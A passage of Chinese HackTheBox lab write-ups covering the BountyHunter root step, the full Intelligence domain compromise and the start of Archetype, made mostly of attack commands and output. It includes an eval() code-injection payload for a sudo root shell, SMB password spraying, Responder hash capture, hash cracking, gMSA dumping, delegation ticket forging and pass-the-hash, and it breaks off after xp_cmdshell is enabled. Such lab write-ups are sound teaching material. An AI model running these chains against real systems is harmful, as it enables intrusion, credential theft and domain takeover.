<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> development on bountyhunter:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User development may run the following commands on bountyhunter:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br></pre></td></tr></table></figure>
<p>查看py文件</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/skytrain_inc/ticketValidator.py</span><br><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_file</span>(<span class="params">loc</span>):</span></span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span>(<span class="params">ticketFile</span>):</span></span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            print(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>):</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:</span><br><span class="line">                validationNumber = <span class="built_in">eval</span>(x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    fileName = <span class="built_in">input</span>(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        print(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>eval()可以进行执行命令</p>
<p>构造恶意文本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/1.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># Skytrain Inc</span></span><br><span class="line"><span class="comment">## Ticket to Bridgeport</span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**11+<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)&quot;</span>)**</span><br><span class="line"><span class="comment">##Issued: 2021/06/21</span></span><br><span class="line"><span class="comment">#End Ticket</span></span><br></pre></td></tr></table></figure>
<p>提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">/tmp/1.md</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">d8b513ba7130a46641d2c65966f6b8e6</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hachthebox_intelligence"><a class="markdownIt-Anchor" href="#hachthebox_intelligence"></a> HachTheBox_Intelligence</h1>
<h2 id="端口扫描-14"><a class="markdownIt-Anchor" href="#端口扫描-14"></a> 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.248</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.248</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 988 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-18 12:54:48Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2>
<p>访问80端口，可以看到主页上有两个PDF的链接</p>
<p>尝试枚举其他PDF</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">            year = <span class="built_in">str</span>(<span class="number">2020</span> + i)</span><br><span class="line">            month = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(j)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(j)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(j)</span><br><span class="line">            day = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(k)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(k)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(k)</span><br><span class="line">            url = <span class="string">&quot;http://10.10.10.248/documents/&quot;</span> + year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">            res = req.get(url)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                filename = year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">                print(filename)</span><br><span class="line">                file = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">                file.write(res.content)</span><br></pre></td></tr></table></figure>
<p>获取PDF的用户名</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.sh</span></span><br><span class="line">filelist=`ls *.pdf`</span><br><span class="line">filenum=`ls *.pdf|wc -l`</span><br><span class="line"><span class="keyword">for</span> ((i=1;i&lt;=<span class="variable">$filenum</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    filename[<span class="variable">$&#123;i&#125;</span>]=`ls *.pdf| sed -n <span class="variable">$&#123;i&#125;</span>p`</span><br><span class="line">    <span class="built_in">echo</span> `exiftool <span class="variable">$&#123;filename[<span class="variable">$&#123;i&#125;</span>]&#125;</span> | grep Creator | awk -F \  <span class="string">&#x27;&#123;print \$3&#125;&#x27;</span>` &gt;&gt; user</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>从2020-06-04-upload.pdf中得到一个密码<code>NewIntelligenceCorpUser9876</code></p>
<p>爆破SMB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876</span><br><span class="line"></span><br><span class="line">SMB         10.10.10.248    445    DC               [+] intelligence\Tiffany.Molina:NewIntelligenceCorpUser9876</span><br></pre></td></tr></table></figure>
<p>查看SMB路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</span><br><span class="line"></span><br><span class="line">    Disk                                                    Permissions Comment</span><br><span class="line">    ----                                                    ----------- -------</span><br><span class="line">    ADMIN$                                              NO ACCESS   Remote Admin</span><br><span class="line">    C$                                                  NO ACCESS   Default share</span><br><span class="line">    IPC$                                                READ ONLY   Remote IPC</span><br><span class="line">    IT                                                  READ ONLY   </span><br><span class="line">    NETLOGON                                            READ ONLY   Logon server share </span><br><span class="line">    SYSVOL                                              READ ONLY   Logon server share </span><br><span class="line">    Users                                               READ ONLY</span><br></pre></td></tr></table></figure>
<p>获得user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.248/users -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line"><span class="built_in">cd</span> Tiffany.Molina\Desktop\</span><br><span class="line">get user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br><span class="line"></span><br><span class="line">bbfd0948d53d769c6ec2fcc02181fa7b</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2>
<p>获取powershell脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.248/IT -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line">get downdetector.ps1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat downdetector.ps1</span><br><span class="line"></span><br><span class="line"># Check web server status. Scheduled to run every 5min</span><br><span class="line">Import-Module ActiveDirectory </span><br><span class="line">foreach($record in Get-ChildItem &quot;AD:DC&#x3D;intelligence.htb,CN&#x3D;MicrosoftDNS,DC&#x3D;DomainDnsZones,DC&#x3D;intelligence,DC&#x3D;htb&quot; | Where-Object Name -like &quot;web*&quot;)  &#123;</span><br><span class="line">try &#123;</span><br><span class="line">$request &#x3D; Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;$($record.Name)&quot; -UseDefaultCredentials</span><br><span class="line">if(.StatusCode -ne 200) &#123;</span><br><span class="line">Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>伪造域名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py</span><br><span class="line">python3 dnstool.py -u <span class="string">&quot;intelligence.htb\Tiffany.Molina&quot;</span> -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.16.24 10.10.10.248</span><br></pre></td></tr></table></figure>
<p>获取账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br><span class="line"></span><br><span class="line">Ted.Graves::intelligence:a0ccbece497d44d6:5F06EFF458D65EF3D277BBEF99522C05:01010000000000006E002FBCEB7ED70155A10145AE3210F90000000002000800320041004400530001001E00570049004E002D00490056004200580046004E00320037003300340045000400140032004100440053002E004C004F00430041004C0003003400570049004E002D00490056004200580046004E00320037003300340045002E0032004100440053002E004C004F00430041004C000500140032004100440053002E004C004F00430041004C000800300030000000000000000000000000200000A9E570CA9FC3E890033A04EB61C9D3A383AF9C961FCC3E1B59979F2C02378B410A0010000000000000000000000000000000000009003E0048005400540050002F007700650062003100310034003500310034002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span><br></pre></td></tr></table></figure>
<p>爆破Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Mr.Teddy         (Ted.Graves)</span><br></pre></td></tr></table></figure>
<p>获得凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ted.Graves:Mr.Teddy</span><br></pre></td></tr></table></figure>
<p>获取Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br><span class="line"></span><br><span class="line">svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7</span><br></pre></td></tr></table></figure>
<p>获取SPN</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/the-useless-one/pywerview</span><br><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line"></span><br><span class="line">msds-allowedtodelegateto:       WWW/dc.intelligence.htb</span><br></pre></td></tr></table></figure>
<p>获取ST</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::</span><br></pre></td></tr></table></figure>
<p>Hash登入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.248 -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">0c6b9779d283e244e79b11c78fc1fb92</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_archetype"><a class="markdownIt-Anchor" href="#hackthebox_archetype"></a> HackTheBox_Archetype</h1>
<p>Windows</p>
<h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.27</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.27</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2>
<p>用smbmap先扫描一波SMB服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27</span><br><span class="line">[+] IP: 10.10.10.27:445	Name: 10.10.10.27</span><br></pre></td></tr></table></figure>
<p>随便加个用户名</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27 -u <span class="built_in">test</span></span><br><span class="line">[+] Guest session   	IP: 10.10.10.27:445	Name: 10.10.10.27                                       </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	backups                                           	READ ONLY	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br></pre></td></tr></table></figure>
<p>空密码即可登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.27\\backups -U <span class="built_in">test</span></span><br><span class="line">Enter WORKGROUP\<span class="built_in">test</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; dir</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020</span></span><br><span class="line"><span class="string">  schtasks.txt                        A   174006  Fri Jun  4 12:05:57 2021</span></span><br><span class="line"><span class="string">  services.txt                        A     6370  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		10328063 blocks of size 4096. 8165400 blocks available</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get prod.dtsConfig</span><br><span class="line">getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DTSConfiguration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DTSConfigurationFileInfo</span> <span class="attr">GeneratedBy</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageName</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageID</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedDate</span>=<span class="string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;</span>&quot;/&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ConfiguredType</span>=<span class="string">&quot;Property&quot;</span> <span class="attr">Path</span>=<span class="string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> <span class="attr">ValueType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ConfiguredValue</span>&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="tag">&lt;/<span class="name">ConfiguredValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DTSConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到MSSQL账户<code>ARCHETYPE\sql_svc:M3g4c0rp123</code></p>
<p>这里使用impacket来登入</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>可以执行系统命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line">[*] 